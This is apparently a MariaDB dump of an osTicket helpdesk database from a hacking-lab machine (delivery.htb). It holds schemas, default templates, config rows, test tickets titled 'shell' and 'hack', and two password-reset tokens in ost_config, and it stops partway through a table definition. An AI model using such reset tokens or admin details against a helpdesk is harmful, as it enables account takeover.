-- MySQL dump 10.18  Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: osticket
-- ------------------------------------------------------
-- Server version	10.3.27-MariaDB-0+deb10u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `ost__search`
--

DROP TABLE IF EXISTS `ost__search`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost__search` (
  `object_type` varchar(8) NOT NULL,
  `object_id` int(11) unsigned NOT NULL,
  `title` text DEFAULT NULL,
  `content` text DEFAULT NULL,
  PRIMARY KEY (`object_type`,`object_id`),
  FULLTEXT KEY `search` (`title`,`content`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost__search`
--

LOCK TABLES `ost__search` WRITE;
/*!40000 ALTER TABLE `ost__search` DISABLE KEYS */;
INSERT INTO `ost__search` VALUES ('H',1,'osTicket Installed!','Thank you for choosing osTicket. Please make sure you join the osTicket forums and our mailing list to stay up to date on the latest news, security alerts and updates. The osTicket forums are also a great place to get assistance, guidance, tips, and help from other osTicket users. In addition to the forums, the osTicket wiki provides a useful collection of educational materials, documentation, and notes from the community. We welcome your contributions to the osTicket community. If you are looking for a greater level of support, we provide professional services and commercial support with guaranteed response times, and access to the core development team. We can also help customize osTicket or even add new features to the system to meet your unique needs. If the idea of managing and upgrading this osTicket installation is daunting, you can try osTicket as a hosted service at https://supportsystem.com/ -- no installation required and we can import your data! With SupportSystem\'s turnkey infrastructure, you get osTicket at its best, leaving you free to focus on your customers without the burden of making sure the application is stable, maintained, and secure. Cheers, - osTicket Team https://osticket.com/ PS. Don\'t just make customers happy, make happy customers!'),('H',2,'','fdgfdgdfdfgfdg'),('H',3,'','test'),('H',4,'','test'),('H',5,'','test'),('H',6,'','test'),('H',7,'','erterter'),('H',14,'','asdf'),('H',16,'','sdfsdf'),('H',17,'','sdf \\\\\\'),('H',18,'','sdfsdf \\\\\\\\'),('H',19,'','zxc'),('H',20,'','sdfsdf \\\\\\\\'),('O',1,'osTicket','1120 5th Street Alexandria, LA 71301\n(318) 290-3674\nhttps://osticket.com\nNot only do we develop the software, we also use it to manage support for osTicket. Let us help you quickly implement and leverage the full potential of osTicket\'s features and functionality. Contact us for professional support or visit our website for documentation and community support.'),('T',1,'431466 osTicket Installed!',''),('T',2,'5677901 noiss','noiss'),('T',3,'5056505 test','test'),('T',4,'4120849 test','test'),('T',5,'9122359 test','test'),('T',6,'7466068 test','test'),('T',7,'2883226 tretret','tretret'),('T',8,'7147451 shell','shell'),('T',9,'4109302 hack','hack'),('T',10,'6216848 dfgdfgdf','dfgdfgdf'),('T',11,'1316174 adf','adf'),('U',1,'osTicket Support','support@osticket.com'),('U',2,'bob',' lol@test.com\nlol@test.com'),('U',3,'9ecfb4be145d47fda0724f697f35ffaf',' 9ecfb4be145d47fda0724f697f35ffaf@mail.htb\n9ecfb4be145d47fda0724f697f35ffaf@mail.htb'),('U',4,'c3ecacacc7b94f909d04dbfd308a9b93',' c3ecacacc7b94f909d04dbfd308a9b93@mail.htb\nc3ecacacc7b94f909d04dbfd308a9b93@mail.htb'),('U',5,'ff0a21fc6fc2488195e16ea854c963ee',' ff0a21fc6fc2488195e16ea854c963ee@mail.htb\nff0a21fc6fc2488195e16ea854c963ee@mail.htb'),('U',6,'5b785171bfb34762a933e127630c4860',' 5b785171bfb34762a933e127630c4860@mail.htb\n5b785171bfb34762a933e127630c4860@mail.htb'),('U',7,'saint',' saint1@10.10.16.6\nsaint1@10.10.16.6'),('U',8,'sdfsdf',' test@test.de\ntest@test.de'),('U',9,'hacking',' hack@hack.de\nhack@hack.de'),('U',10,'test',' test@delivery.htb\ntest@delivery.htb'),('U',11,'hacker',' hacker@shell.gov\nhacker@shell.gov');
/*!40000 ALTER TABLE `ost__search` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_api_key`
--

DROP TABLE IF EXISTS `ost_api_key`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_api_key` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `isactive` tinyint(1) NOT NULL DEFAULT 1,
  `ipaddr` varchar(64) NOT NULL,
  `apikey` varchar(255) NOT NULL,
  `can_create_tickets` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `can_exec_cron` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `notes` text DEFAULT NULL,
  `updated` datetime NOT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `apikey` (`apikey`),
  KEY `ipaddr` (`ipaddr`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_api_key`
--

LOCK TABLES `ost_api_key` WRITE;
/*!40000 ALTER TABLE `ost_api_key` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_api_key` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_attachment`
--

DROP TABLE IF EXISTS `ost_attachment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_attachment` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `object_id` int(11) unsigned NOT NULL,
  `type` char(1) NOT NULL,
  `file_id` int(11) unsigned NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `inline` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `lang` varchar(16) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `file-type` (`object_id`,`file_id`,`type`),
  UNIQUE KEY `file_object` (`file_id`,`object_id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_attachment`
--

LOCK TABLES `ost_attachment` WRITE;
/*!40000 ALTER TABLE `ost_attachment` DISABLE KEYS */;
INSERT INTO `ost_attachment` VALUES (1,1,'C',2,NULL,0,NULL),(2,8,'T',1,NULL,1,NULL),(3,9,'T',1,NULL,1,NULL),(4,10,'T',1,NULL,1,NULL),(5,11,'T',1,NULL,1,NULL),(6,12,'T',1,NULL,1,NULL),(7,13,'T',1,NULL,1,NULL),(8,14,'T',1,NULL,1,NULL),(9,16,'T',1,NULL,1,NULL),(10,17,'T',1,NULL,1,NULL),(11,18,'T',1,NULL,1,NULL),(12,19,'T',1,NULL,1,NULL),(17,8,'H',3,NULL,1,NULL),(19,9,'H',3,NULL,1,NULL);
/*!40000 ALTER TABLE `ost_attachment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_canned_response`
--

DROP TABLE IF EXISTS `ost_canned_response`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_canned_response` (
  `canned_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `dept_id` int(10) unsigned NOT NULL DEFAULT 0,
  `isenabled` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `title` varchar(255) NOT NULL DEFAULT '',
  `response` text NOT NULL,
  `lang` varchar(16) NOT NULL DEFAULT 'en_US',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`canned_id`),
  UNIQUE KEY `title` (`title`),
  KEY `dept_id` (`dept_id`),
  KEY `active` (`isenabled`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_canned_response`
--

LOCK TABLES `ost_canned_response` WRITE;
/*!40000 ALTER TABLE `ost_canned_response` DISABLE KEYS */;
INSERT INTO `ost_canned_response` VALUES (1,0,1,'What is osTicket (sample)?','osTicket is a widely-used open source support ticket system, an\nattractive alternative to higher-cost and complex customer support\nsystems - simple, lightweight, reliable, open source, web-based and easy\nto setup and use.','en_US',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,0,1,'Sample (with variables)','Hi %{ticket.name.first},\n<br>\n<br>\nYour ticket #%{ticket.number} created on %{ticket.create_date} is in\n%{ticket.dept.name} department.','en_US',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_canned_response` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_config`
--

DROP TABLE IF EXISTS `ost_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_config` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `namespace` varchar(64) NOT NULL,
  `key` varchar(64) NOT NULL,
  `value` text NOT NULL,
  `updated` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `namespace` (`namespace`,`key`)
) ENGINE=InnoDB AUTO_INCREMENT=120 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_config`
--

LOCK TABLES `ost_config` WRITE;
/*!40000 ALTER TABLE `ost_config` DISABLE KEYS */;
INSERT INTO `ost_config` VALUES (1,'core','admin_email','maildeliverer@delivery.htb','2020-12-26 14:14:00'),(2,'core','helpdesk_url','http://helpdesk.delivery.htb/','2020-12-26 14:14:00'),(3,'core','helpdesk_title','delivery','2020-12-26 14:14:00'),(4,'core','schema_signature','add628927ee030469f5d3272ebda1e16','2020-12-26 14:14:00'),(5,'schedule.1','configuration','{\"holidays\":[4]}','2020-12-26 14:14:00'),(6,'core','time_format','hh:mm a','2020-12-26 14:14:00'),(7,'core','date_format','MM/dd/y','2020-12-26 14:14:00'),(8,'core','datetime_format','MM/dd/y h:mm a','2020-12-26 14:14:00'),(9,'core','daydatetime_format','EEE, MMM d y h:mm a','2020-12-26 14:14:00'),(10,'core','default_priority_id','2','2020-12-26 14:14:00'),(11,'core','enable_daylight_saving','','2020-12-26 14:14:00'),(12,'core','reply_separator','-- reply above this line --','2020-12-26 14:14:00'),(13,'core','isonline','1','2020-12-26 14:14:00'),(14,'core','staff_ip_binding','','2020-12-26 14:14:00'),(15,'core','staff_max_logins','4','2020-12-26 14:14:00'),(16,'core','staff_login_timeout','2','2020-12-26 14:14:00'),(17,'core','staff_session_timeout','30','2020-12-26 14:14:00'),(18,'core','passwd_reset_period','','2020-12-26 14:14:00'),(19,'core','client_max_logins','4','2020-12-26 14:14:00'),(20,'core','client_login_timeout','2','2020-12-26 14:14:00'),(21,'core','client_session_timeout','30','2020-12-26 14:14:00'),(22,'core','max_page_size','25','2020-12-26 14:14:00'),(23,'core','max_open_tickets','100','2020-12-26 15:28:54'),(24,'core','autolock_minutes','3','2020-12-26 14:14:00'),(25,'core','default_smtp_id','','2020-12-26 14:14:00'),(26,'core','use_email_priority','','2020-12-26 14:14:00'),(27,'core','enable_kb','','2020-12-26 14:14:00'),(28,'core','enable_premade','1','2020-12-26 14:14:00'),(29,'core','enable_captcha','1','2020-12-26 15:28:48'),(30,'core','enable_auto_cron','','2020-12-26 14:14:00'),(31,'core','enable_mail_polling','','2020-12-26 14:14:00'),(32,'core','send_sys_errors','0','2020-12-26 15:28:41'),(33,'core','send_sql_errors','1','2020-12-26 14:14:00'),(34,'core','send_login_errors','1','2020-12-26 14:14:00'),(35,'core','save_email_headers','1','2020-12-26 14:14:00'),(36,'core','strip_quoted_reply','1','2020-12-26 14:14:00'),(37,'core','ticket_autoresponder','','2020-12-26 14:14:00'),(38,'core','message_autoresponder','','2020-12-26 14:14:00'),(39,'core','ticket_notice_active','0','2020-12-26 15:29:01'),(40,'core','ticket_alert_active','0','2020-12-26 15:29:09'),(41,'core','ticket_alert_admin','1','2020-12-26 14:14:00'),(42,'core','ticket_alert_dept_manager','1','2020-12-26 14:14:00'),(43,'core','ticket_alert_dept_members','','2020-12-26 14:14:00'),(44,'core','message_alert_active','0','2020-12-26 15:29:09'),(45,'core','message_alert_laststaff','1','2020-12-26 14:14:00'),(46,'core','message_alert_assigned','1','2020-12-26 14:14:00'),(47,'core','message_alert_dept_manager','','2020-12-26 14:14:00'),(48,'core','note_alert_active','0','2020-12-26 15:28:41'),(49,'core','note_alert_laststaff','1','2020-12-26 14:14:00'),(50,'core','note_alert_assigned','1','2020-12-26 14:14:00'),(51,'core','note_alert_dept_manager','','2020-12-26 14:14:00'),(52,'core','transfer_alert_active','0','2020-12-26 15:28:41'),(53,'core','transfer_alert_assigned','','2020-12-26 14:14:00'),(54,'core','transfer_alert_dept_manager','1','2020-12-26 14:14:00'),(55,'core','transfer_alert_dept_members','','2020-12-26 14:14:00'),(56,'core','overdue_alert_active','1','2020-12-26 14:14:00'),(57,'core','overdue_alert_assigned','1','2020-12-26 14:14:00'),(58,'core','overdue_alert_dept_manager','1','2020-12-26 14:14:00'),(59,'core','overdue_alert_dept_members','','2020-12-26 14:14:00'),(60,'core','assigned_alert_active','0','2020-12-26 15:29:09'),(61,'core','assigned_alert_staff','1','2020-12-26 14:14:00'),(62,'core','assigned_alert_team_lead','','2020-12-26 14:14:00'),(63,'core','assigned_alert_team_members','','2020-12-26 14:14:00'),(64,'core','auto_claim_tickets','1','2020-12-26 14:14:00'),(65,'core','auto_refer_closed','1','2020-12-26 14:14:00'),(66,'core','collaborator_ticket_visibility','1','2020-12-26 14:14:00'),(67,'core','require_topic_to_close','','2020-12-26 14:14:00'),(68,'core','show_related_tickets','0','2020-12-26 15:28:48'),(69,'core','show_assigned_tickets','1','2020-12-26 14:14:00'),(70,'core','show_answered_tickets','','2020-12-26 14:14:00'),(71,'core','hide_staff_name','','2020-12-26 14:14:00'),(72,'core','disable_agent_collabs','','2020-12-26 14:14:00'),(73,'core','overlimit_notice_active','','2020-12-26 14:14:00'),(74,'core','email_attachments','1','2020-12-26 14:14:00'),(75,'core','ticket_number_format','######','2020-12-26 14:14:00'),(76,'core','ticket_sequence_id','','2020-12-26 14:14:00'),(77,'core','queue_bucket_counts','','2020-12-26 14:14:00'),(78,'core','allow_external_images','1','2020-12-26 14:14:00'),(79,'core','task_number_format','#','2020-12-26 14:14:00'),(80,'core','task_sequence_id','2','2020-12-26 14:14:00'),(81,'core','log_level','2','2020-12-26 14:14:00'),(82,'core','log_graceperiod','12','2020-12-26 14:14:00'),(83,'core','client_registration','public','2020-12-26 14:14:00'),(84,'core','default_ticket_queue','1','2020-12-26 14:14:00'),(85,'core','embedded_domain_whitelist','youtube.com, dailymotion.com, vimeo.com, player.vimeo.com, web.microsoftstream.com','2020-12-26 14:14:00'),(86,'core','max_file_size','1048576','2020-12-26 14:14:00'),(87,'core','landing_page_id','1','2020-12-26 14:14:00'),(88,'core','thank-you_page_id','2','2020-12-26 14:14:00'),(89,'core','offline_page_id','3','2020-12-26 14:14:00'),(90,'core','system_language','en_US','2020-12-26 14:14:00'),(91,'mysqlsearch','reindex','0','2020-12-26 14:31:05'),(92,'core','default_email_id','1','2020-12-26 14:14:00'),(93,'core','alert_email_id','2','2020-12-26 14:14:00'),(94,'core','default_dept_id','1','2020-12-26 14:14:00'),(95,'core','default_sla_id','1','2020-12-26 14:14:00'),(96,'core','schedule_id','1','2020-12-26 14:14:00'),(97,'core','default_template_id','1','2020-12-26 14:14:00'),(98,'core','default_timezone','America/New_York','2020-12-26 14:14:00'),(99,'core','client_passwd_policy',' ','2020-12-26 14:18:17'),(100,'core','clients_only','','2020-12-26 14:18:17'),(101,'core','client_verify_email','','2020-12-26 14:18:17'),(102,'core','allow_auth_tokens','1','2020-12-26 14:18:17'),(103,'core','client_name_format','original','2020-12-26 14:18:17'),(104,'core','client_avatar','gravatar.mm','2020-12-26 14:18:17'),(105,'core','message_autoresponder_collabs','0','2020-12-26 15:29:01'),(106,'core','ticket_alert_acct_manager','','2020-12-26 15:28:41'),(107,'core','message_alert_acct_manager','','2020-12-26 15:28:41'),(108,'core','default_help_topic','0','2020-12-26 15:28:48'),(109,'core','default_ticket_status_id','1','2020-12-26 15:28:48'),(110,'core','allow_client_updates','','2020-12-26 15:28:48'),(111,'core','ticket_lock','2','2020-12-26 15:28:48'),(112,'core','agent_passwd_policy',' ','2020-12-26 15:29:27'),(113,'core','allow_pw_reset','','2020-12-26 15:29:27'),(114,'core','pw_reset_window','30','2020-12-26 15:29:27'),(115,'core','require_agent_2fa','','2020-12-26 15:29:27'),(116,'core','agent_name_format','full','2020-12-26 15:29:27'),(117,'core','agent_avatar','gravatar.mm','2020-12-26 15:29:27'),(118,'pwreset','wn5eNqjPDEw6L2QVvhw0msdTflrj=7lE83pvsbuuCzPMfhrh','c7','2021-01-30 21:33:45'),(119,'pwreset','SnG7kwFPdW3NTlzMwYE7RmBDBt92a7yODjTrwyQEM0RW7bgO','c9','2021-01-30 22:02:40');
/*!40000 ALTER TABLE `ost_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_content`
--

DROP TABLE IF EXISTS `ost_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_content` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `isactive` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `type` varchar(32) NOT NULL DEFAULT 'other',
  `name` varchar(255) NOT NULL,
  `body` text NOT NULL,
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_content`
--

LOCK TABLES `ost_content` WRITE;
/*!40000 ALTER TABLE `ost_content` DISABLE KEYS */;
INSERT INTO `ost_content` VALUES (1,1,'landing','Landing','<h1>Welcome to the Support Center</h1> <p> In order to streamline support requests and better serve you, we utilize a support ticket system. Every support request is assigned a unique ticket number which you can use to track the progress and responses online. For your reference we provide complete archives and history of all your support requests. A valid email address is required to submit a ticket. </p>','The Landing Page refers to the content of the Customer Portal\'s initial view. The template modifies the content seen above the two links <strong>Open a New Ticket</strong> and <strong>Check Ticket Status</strong>.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,1,'thank-you','Thank You','<p>%{ticket.name},¬†<br /><br />You may check the status of your ticket, by navigating to the Check Status page using ticket id: %{ticket.number}.</p> <p>If you want to add more information to your ticket, just email %{ticket.number}@delivery.htb.</p> <p>Thanks,</p> <p>Support Team</p>','<p>This template defines the content displayed on the Thank-You page after a Client submits a new ticket in the Client Portal.</p>','2020-12-26 09:14:00','2020-12-26 10:39:37'),(3,1,'offline','Offline','<div><h1>\n<span style=\"font-size: medium\">Support Ticket System Offline</span>\n</h1>\n<p>Thank you for your interest in contacting us.</p>\n<p>Our helpdesk is offline at the moment, please check back at a later\ntime.</p>\n</div>','The Offline Page appears in the Customer Portal when the Help Desk is offline.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,1,'registration-staff','Welcome to osTicket','<h3><strong>Hi %{recipient.name.first},</strong></h3> <div> We\'ve created an account for you at our help desk at %{url}.<br /> <br /> Please follow the link below to confirm your account and gain access to your tickets.<br /> <br /> <a href=\"%{link}\">%{link}</a><br /> <br /> <em style=\"font-size: small\">Your friendly Customer Support System<br /> %{company.name}</em> </div>','This template defines the initial email (optional) sent to Agents when an account is created on their behalf.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(5,1,'pwreset-staff','osTicket Staff Password Reset','<h3><strong>Hi %{staff.name.first},</strong></h3> <div> A password reset request has been submitted on your behalf for the helpdesk at %{url}.<br /> <br /> If you feel that this has been done in error, delete and disregard this email. Your account is still secure and no one has been given access to it. It is not locked and your password has not been reset. Someone could have mistakenly entered your email address.<br /> <br /> Follow the link below to login to the help desk and change your password.<br /> <br /> <a href=\"%{link}\">%{link}</a><br /> <br /> <em style=\"font-size: small\">Your friendly Customer Support System</em> <br /> <img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width: 126px\" /> </div>','This template defines the email sent to Staff who select the <strong>Forgot My Password</strong> link on the Staff Control Panel Log In page.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(6,1,'banner-staff','Authentication Required','','This is the initial message and banner shown on the Staff Log In page. The first input field refers to the red-formatted text that appears at the top. The latter textarea is for the banner content which should serve as a disclaimer.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(7,1,'registration-client','Welcome to %{company.name}','<h3><strong>Hi %{recipient.name.first},</strong></h3> <div> We\'ve created an account for you at our help desk at %{url}.<br /> <br /> Please follow the link below to confirm your account and gain access to your tickets.<br /> <br /> <a href=\"%{link}\">%{link}</a><br /> <br /> <em style=\"font-size: small\">Your friendly Customer Support System <br /> %{company.name}</em> </div>','This template defines the email sent to Clients when their account has been created in the Client Portal or by an Agent on their behalf. This email serves as an email address verification. Please use %{link} somewhere in the body.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(8,1,'pwreset-client','%{company.name} Help Desk Access','<h3><strong>Hi %{user.name.first},</strong></h3> <div> A password reset request has been submitted on your behalf for the helpdesk at %{url}.<br /> <br /> If you feel that this has been done in error, delete and disregard this email. Your account is still secure and no one has been given access to it. It is not locked and your password has not been reset. Someone could have mistakenly entered your email address.<br /> <br /> Follow the link below to login to the help desk and change your password.<br /> <br /> <a href=\"%{link}\">%{link}</a><br /> <br /> <em style=\"font-size: small\">Your friendly Customer Support System <br /> %{company.name}</em> </div>','This template defines the email sent to Clients who select the <strong>Forgot My Password</strong> link on the Client Log In page.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(9,1,'banner-client','Sign in to %{company.name}','To better serve you, we encourage our Clients to register for an account.','This composes the header on the Client Log In page. It can be useful to inform your Clients about your log in and registration policies.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(10,1,'registration-confirm','Account registration','<div><strong>Thanks for registering for an account.</strong><br/> <br /> We\'ve just sent you an email to the address you entered. Please follow the link in the email to confirm your account and gain access to your tickets. </div>','This templates defines the page shown to Clients after completing the registration form. The template should mention that the system is sending them an email confirmation link and what is the next step in the registration process.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(11,1,'registration-thanks','Account Confirmed!','<div> <strong>Thanks for registering for an account.</strong><br /> <br /> You\'ve confirmed your email address and successfully activated your account. You may proceed to open a new ticket or manage existing tickets.<br /> <br /> <em>Your friendly support center</em><br /> %{company.name} </div>','This template defines the content displayed after Clients successfully register by confirming their account. This page should inform the user that registration is complete and that the Client can now submit a ticket or access existing tickets.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(12,1,'access-link','Ticket [#%{ticket.number}] Access Link','<h3><strong>Hi %{recipient.name.first},</strong></h3> <div> An access link request for ticket #%{ticket.number} has been submitted on your behalf for the helpdesk at %{url}.<br /> <br /> Follow the link below to check the status of the ticket #%{ticket.number}.<br /> <br /> <a href=\"%{recipient.ticket_link}\">%{recipient.ticket_link}</a><br /> <br /> If you <strong>did not</strong> make the request, please delete and disregard this email. Your account is still secure and no one has been given access to the ticket. Someone could have mistakenly entered your email address.<br /> <br /> --<br /> %{company.name} </div>','This template defines the notification for Clients that an access link was sent to their email. The ticket number and email address trigger the access link.','2020-12-26 09:14:00','2020-12-26 09:14:00'),(13,1,'email2fa-staff','osTicket Two Factor Authentication','<h3><strong>Hi %{staff.name.first},</strong></h3> <div> You have just logged into for the helpdesk at %{url}.<br /> <br /> Use the verification code below to finish logging into the helpdesk.<br /> <br /> %{otp}<br /> <br /> <em style=\"font-size: small\">Your friendly Customer Support System</em> <br /> <img src=\"cid:b56944cb4722cc5cda9d1e23a3ea7fbc\" alt=\"Powered by osTicket\" width=\"126\" height=\"19\" style=\"width: 126px\" /> </div>','This template defines the email sent to Staff who use Email for Two Factor Authentication','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_department`
--

DROP TABLE IF EXISTS `ost_department`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_department` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(11) unsigned DEFAULT NULL,
  `tpl_id` int(10) unsigned NOT NULL DEFAULT 0,
  `sla_id` int(10) unsigned NOT NULL DEFAULT 0,
  `schedule_id` int(10) unsigned NOT NULL DEFAULT 0,
  `email_id` int(10) unsigned NOT NULL DEFAULT 0,
  `autoresp_email_id` int(10) unsigned NOT NULL DEFAULT 0,
  `manager_id` int(10) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  `name` varchar(128) NOT NULL DEFAULT '',
  `signature` text NOT NULL,
  `ispublic` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `group_membership` tinyint(1) NOT NULL DEFAULT 0,
  `ticket_auto_response` tinyint(1) NOT NULL DEFAULT 1,
  `message_auto_response` tinyint(1) NOT NULL DEFAULT 0,
  `path` varchar(128) NOT NULL DEFAULT '/',
  `updated` datetime NOT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`,`pid`),
  KEY `manager_id` (`manager_id`),
  KEY `autoresp_email_id` (`autoresp_email_id`),
  KEY `tpl_id` (`tpl_id`),
  KEY `flags` (`flags`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_department`
--

LOCK TABLES `ost_department` WRITE;
/*!40000 ALTER TABLE `ost_department` DISABLE KEYS */;
INSERT INTO `ost_department` VALUES (1,NULL,0,0,0,0,0,0,4,'Support','Support Department',1,1,1,1,'/1/','2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,NULL,0,0,0,0,0,0,4,'Maintenance','Maintenance Department',1,0,1,1,'/3/','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_department` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_draft`
--

DROP TABLE IF EXISTS `ost_draft`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_draft` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `staff_id` int(11) unsigned NOT NULL,
  `namespace` varchar(32) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  `extra` text DEFAULT NULL,
  `created` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `staff_id` (`staff_id`),
  KEY `namespace` (`namespace`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_draft`
--

LOCK TABLES `ost_draft` WRITE;
/*!40000 ALTER TABLE `ost_draft` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_draft` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_email`
--

DROP TABLE IF EXISTS `ost_email`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_email` (
  `email_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `noautoresp` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `priority_id` int(11) unsigned NOT NULL DEFAULT 2,
  `dept_id` int(11) unsigned NOT NULL DEFAULT 0,
  `topic_id` int(11) unsigned NOT NULL DEFAULT 0,
  `email` varchar(255) NOT NULL DEFAULT '',
  `name` varchar(255) NOT NULL DEFAULT '',
  `userid` varchar(255) NOT NULL,
  `userpass` varchar(255) CHARACTER SET ascii NOT NULL,
  `mail_active` tinyint(1) NOT NULL DEFAULT 0,
  `mail_host` varchar(255) NOT NULL,
  `mail_protocol` enum('POP','IMAP') NOT NULL DEFAULT 'POP',
  `mail_encryption` enum('NONE','SSL') NOT NULL,
  `mail_folder` varchar(255) DEFAULT NULL,
  `mail_port` int(6) DEFAULT NULL,
  `mail_fetchfreq` tinyint(3) NOT NULL DEFAULT 5,
  `mail_fetchmax` tinyint(4) NOT NULL DEFAULT 30,
  `mail_archivefolder` varchar(255) DEFAULT NULL,
  `mail_delete` tinyint(1) NOT NULL DEFAULT 0,
  `mail_errors` tinyint(3) NOT NULL DEFAULT 0,
  `mail_lasterror` datetime DEFAULT NULL,
  `mail_lastfetch` datetime DEFAULT NULL,
  `smtp_active` tinyint(1) DEFAULT 0,
  `smtp_host` varchar(255) NOT NULL,
